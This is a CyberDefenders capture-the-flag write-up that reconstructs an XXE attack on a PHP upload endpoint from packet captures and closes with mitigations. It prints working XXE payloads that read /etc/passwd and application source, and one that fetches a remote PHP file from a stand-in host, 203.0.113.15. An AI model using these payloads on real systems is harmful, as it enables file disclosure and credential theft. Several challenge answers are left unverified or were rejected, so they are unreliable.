# CyberDefenders – XXE Infiltration Lab

**Category:** Network Forensics  
**Difficulty:** Easy  
**Tools Used:** Wireshark, Brim  
**Focus:** XXE Injection, Network Traffic Analysis, Credential Theft, MySQL Authentication, Web Shell Detection

## 1. Lab Overview

The XXE Infiltration Lab focuses on investigating a network intrusion involving an XML External Entity (XXE) vulnerability in a PHP-based web application.

The attacker performs reconnaissance against the victim server, identifies an exposed service, exploits an insecure XML upload functionality, accesses sensitive local files, extracts database credentials, authenticates to MySQL, and deploys a PHP web shell for persistence.

The objective is to reconstruct the attack using packet capture (PCAP) analysis and identify the evidence associated with each stage.

## 2. Investigation and Methodology

### Q1. Identify the highest-numbered open TCP port

**Wireshark filter:**

```wireshark
tcp.flags.syn == 1 && tcp.flags.ack == 1
```

During a TCP SYN scan, the attacker sends SYN packets to different ports.

When a port is open, the victim responds with a SYN-ACK packet.

The source port of the SYN-ACK packet represents the open port on the victim.

I applied the filter in Wireshark and inspected the TCP source ports to identify the highest-numbered open port.

**Finding:** 3306 was visible in the initial packet inspection. The complete packet list should be checked to confirm that no higher-numbered port responded.

### Q2. Identify the vulnerable PHP script

**Wireshark filter:**

```wireshark
http.request.method == "POST"
```

I inspected the HTTP POST requests to identify suspicious XML uploads.

The traffic revealed requests directed towards:

```text
/review/upload.php
```

I followed the HTTP stream and examined the uploaded XML content.

The endpoint accepted XML files and processed their contents without properly preventing external entity resolution.

**Finding:**

```text
/review/upload.php
```

This was the vulnerable PHP upload endpoint responsible for processing the malicious XML payload.

### Q3. Identify the first malicious XML file

I examined the HTTP POST requests directed towards the vulnerable upload endpoint.

The request contained a multipart/form-data upload with the following filename:

```text
TheGreatGatsby.xml
```

The XML content contained an external entity declaration referencing a local system file.

Example payload:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

The XML parser resolved the external entity and returned the contents of the referenced file.

**Finding:**

```text
TheGreatGatsby.xml
```

### Q4. Identify the web application configuration file

The next stage involved identifying sensitive files accessed through XXE.

I inspected subsequent XML upload requests and examined their DOCTYPE declarations.

The attacker used external entity references to access local files.

For example:

```xml
<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">
```

One request successfully retrieved the source code of `index.php`.

However, the objective was to identify the application's configuration file, which could contain database credentials.

The configuration filename must be confirmed from the remaining XML payloads.

**Investigation target:** `config.php` (verify against the actual packet contents).

### Q5. Extract the compromised database password

After identifying the configuration file, the next step was to inspect the XXE response containing its contents.

The configuration file may contain database connection parameters such as:

```php
$servername = "localhost";
$username = "db_user";
$password = "database_password";
```

I would extract the password from the actual HTTP response rather than infer it from the filename.

**Finding:** Requires verification from the configuration-file response in the PCAP.

### Q6. Identify the first MySQL login attempt

After obtaining database credentials, the attacker attempted to authenticate to the victim's MySQL service.

**Wireshark display filter:**

```wireshark
mysql.login_request
```

The filtered traffic revealed MySQL login request packets travelling from:

```text
Attacker: 210.106.114.183
Victim:   50.239.151.185
Port:     3306
```

I selected the login request packets and inspected their Frame details.

The relevant field is:

```text
Arrival Time
```

Wireshark displays the packet's absolute arrival timestamp in UTC.

An initial candidate was:

```text
2024-05-31 11:47:24.342179 UTC
```

However, this timestamp was rejected by the challenge. Therefore, the correct first credential-based login attempt must be verified by inspecting the username and authentication sequence in the remaining login packets.

The required submission format is:

```text
yyyy-mm-dd hh:mm
```

### Q7. Identify the uploaded web shell

The final investigation stage involved identifying the PHP web shell used for remote code execution and persistence.

I examined the XML upload request containing the filename:

```text
PrideandPrejudice.xml
```

The XML payload contained the following external entity declarations:

```xml
<!ENTITY % payload SYSTEM "http://203.0.113.15/booking.php">
<!ENTITY % internals "<!ENTITY file SYSTEM 'php://filter/read=convert.base64-encode/resource=%payload;'>">
```

This payload references a remote PHP resource hosted at:

```text
http://203.0.113.15/booking.php
```

The PHP filter wrapper indicates that the resource is being accessed through a Base64 encoding mechanism.

**Finding:**

```text
booking.php
```

The remote PHP resource is the web shell identified by the challenge.

## 3. Attack Timeline

The investigation reveals the following sequence of events:

1. **Reconnaissance:** The attacker scans the victim's TCP ports to identify accessible services.
2. **Initial Access:** The attacker identifies the vulnerable PHP XML upload endpoint.
3. **XXE Exploitation:** A malicious XML file is uploaded to exploit external entity resolution.
4. **Credential Access:** The attacker attempts to read sensitive local files, including `/etc/passwd` and application source code.
5. **Database Credential Theft:** The attacker targets the web application's configuration file to obtain database credentials.
6. **Database Access:** The attacker attempts to authenticate to the victim's MySQL service on port 3306.
7. **Persistence:** The attacker references the remote PHP web shell `booking.php`.

## 4. Key Security Findings

- The XML parser allowed external entity resolution.
- The application did not adequately restrict access to local filesystem resources.
- Sensitive application files were potentially exposed through the XML upload functionality.
- Database credentials were at risk of disclosure.
- MySQL was accessible over the network.
- A remote PHP web shell was identified during the investigation.

## 5. Recommended Mitigations

1. Disable external entity processing in the XML parser.
2. Avoid processing untrusted XML with insecure parser configurations.
3. Restrict file upload types and validate uploaded content.
4. Store configuration files outside the web root.
5. Use environment variables or a secrets manager for database credentials.
6. Restrict MySQL access to trusted hosts and networks.
7. Monitor suspicious PHP file uploads and unexpected outbound connections.
8. Remove unauthorized web shells and rotate compromised database credentials.
9. Implement a Web Application Firewall (WAF) and centralized logging.

## 6. Conclusion

The investigation demonstrates how an improperly configured XML parser can expose sensitive server-side information through XXE injection.

By analyzing HTTP traffic, XML payloads, server responses, and MySQL authentication packets, it is possible to reconstruct the attacker's activities and understand the potential impact.

The most important lesson is that an XML upload feature is not inherently safe simply because it accepts structured data. Secure XML parsing, strict file handling, least-privilege access, and proper network segmentation are essential to preventing this type of attack.

**Tools used:** Wireshark 